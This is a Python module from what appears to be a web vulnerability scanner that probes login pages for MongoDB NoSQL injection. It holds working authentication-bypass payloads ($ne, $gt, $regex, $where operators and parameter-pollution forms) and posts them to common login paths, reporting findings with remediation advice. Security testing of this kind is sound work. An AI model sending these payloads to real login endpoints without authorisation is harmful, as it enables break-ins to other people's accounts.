import json
from modules.base import BaseModule


class NosqlModule(BaseModule):
    NAME = "nosql"
    DESCRIPTION = "NoSQL injection - MongoDB operator bypass"

    JSON_PAYLOADS = [
        {"username": {"$ne": None},  "password": {"$ne": None}},
        {"username": {"$gt": ""},    "password": {"$gt": ""}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"username": "admin",        "password": {"$ne": "x"}},
        {"username": {"$ne": "x"},   "password": {"$where": "return true"}},
    ]

    PARAM_PAYLOADS = [
        ("username[$ne]", "x", "password[$ne]", "x"),
        ("username[$gt]", "",  "password[$gt]", ""),
    ]

    LOGIN_PATHS = ["/login", "/login.php", "/api/login", "/auth/login"]

    def run(self):
        self.log.info("[nosql] Testing for NoSQL injection")
        login_url = self._find_login()
        if not login_url:
            return
        self._test_json(login_url)
        self._test_params(login_url)

    def _find_login(self):
        import re
        for path in self.LOGIN_PATHS:
            r = self.get(path)
            if r and r.status_code == 200 and not self.is_probable_not_found(r) and re.search(
                r'<input[^>]+type=["\']password["\']', r.text, re.I
            ):
                return self.url(path)
        return None

    def _success(self, resp) -> bool:
        if not resp or self.is_probable_not_found(resp):
            return False
        low = resp.text.lower()
        return any(kw in low for kw in ["dashboard", "logout", "welcome"])

    def _test_json(self, login_url: str):
        for payload in self.JSON_PAYLOADS:
            resp = self.post(
                login_url, json=payload,
                headers={"Content-Type": "application/json"}
            )
            if self._success(resp):
                self.add_finding(
                    severity="CRITICAL",
                    title="NoSQL Injection - authentication bypass",
                    url=login_url,
                    detail="MongoDB operator injection bypassed login.",
                    payload=json.dumps(payload),
                    remediation=(
                        "Validate and sanitise all input. "
                        "Reject keys starting with '$' in user-supplied JSON."
                    ),
                )
                return

    def _test_params(self, login_url: str):
        for u_param, u_val, p_param, p_val in self.PARAM_PAYLOADS:
            resp = self.post(login_url, data={u_param: u_val, p_param: p_val})
            if self._success(resp):
                self.add_finding(
                    severity="CRITICAL",
                    title="NoSQL Injection via parameter pollution",
                    url=login_url,
                    detail=f"Operator injection via '{u_param}'='{u_val}'.",
                    remediation=(
                        "Reject keys containing '$' or '.' in request parameters."
                    ),
                )
                return
